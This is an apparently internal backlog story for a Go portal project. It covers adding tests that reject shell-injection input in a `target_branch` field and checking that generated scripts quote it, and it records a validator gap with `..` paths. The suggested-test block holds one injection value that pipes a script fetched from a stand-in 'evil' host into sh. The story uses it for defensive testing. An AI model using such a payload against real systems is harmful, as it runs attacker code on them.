---
id: gate-tests-finalize-shell-escape
kind: story
stage: done
tags: [testing, security, portal]
parent: null
depends_on: [gate-security-finalize-script-shell-escape]
release_binding: v0.1.0
gate_origin: tests
created: 2026-05-18
updated: 2026-05-18
---

# Shell-injection vector in `writeCheckoutStep` has no script-output assertion test

## Priority
Critical

## Spec reference
Item: `gate-security-finalize-script-shell-escape`
Acceptance criterion: reject malformed `target_branch` at
`PatchFinalizeLock` time; shell-escape both `target_branch` and
`base_sha` inside `writeCheckoutStep` / `buildPreserveScript` /
`buildSquashScript`.

## Gap type
missing test for valid partition + boundary.
`lock_patch_test.go:227 TestPatchFinalizeLock_InvalidMode_400` validates
the `mode` enum but no analogue rejects malformed `target_branch`.
`script_test.go:42 TestBuildScript_Goldens` asserts golden output but
never feeds an attacker-controlled `target_branch` with shell metachars.

## Suggested test
```go
// TestPatchFinalizeLock_RejectsMaliciousTargetBranch
//   Inputs: `x";curl evil/i.sh|sh;#`, `-rf`, `foo bar`, `foo\nbar`.
//   Expect 400 with code session.invalid_target_branch (no row mutation).
// TestBuildScript_TargetBranch_ShellEscaped
//   If pre-validation is bypassed (defence-in-depth), ensure the
//   embedded value in the generated script is single-quoted / escaped.
```

## Test location (suggested)
`internal/portal/finalize/lock_patch_test.go` and
`internal/portal/finalize/script_test.go`

## Implementation notes

All four tests implemented and passing (`go test ./internal/portal/finalize/...`).

### Files changed
- `internal/portal/finalize/lock_patch_test.go` — added
  `TestPatchFinalizeLock_RejectsMaliciousTargetBranch` (table-driven,
  5 active cases + 1 commented-out; see finding below) and
  `TestPatchFinalizeLock_RejectsMalformedBaseSHA` (6 cases).
- `internal/portal/finalize/escape_test.go` — new file with
  `TestShellquote_EscapesSingleQuotes` (18 cases, bash round-trip via
  `printf`) and `TestBuildScript_TargetBranch_Quoted` (7 branches × 2
  modes, regex + contains assertions).

### Security finding surfaced
**`ValidateTargetBranch` accepts `..`-containing paths** (e.g. `../escape`,
`main/../evil`). Git itself rejects ref names containing `..` per
`git check-ref-format` rules. The validator's regex
`^[A-Za-z0-9._/][A-Za-z0-9._/-]*$` allows these forms.

The `dotdot_escape` test case is commented out with a reference to backlog
item `gate-security-finalize-target-branch-dotdot`, which records the gap
and the fix (`strings.Contains(branch, "..")` guard). This test will be
un-commented once that item is resolved.

## Review (2026-05-18)

**Verdict**: Approve

**Blockers**: none
**Important**: none
**Nits**: none

**Notes**: Four tests added: PatchFinalizeLock rejection of malicious target_branch (5 cases, 400 envelope, no DB mutation), PatchFinalizeLock rejection of malformed base_sha (6 cases), Shellquote escape correctness (18 cases with bash round-trip via printf), generated-script quoting (7 branches × 2 modes regex match). The dotdot finding surfaced during this test pass has been fixed inline as gate-security-finalize-target-branch-dotdot — that story is now at done, and the two dotdot test cases are active and green.
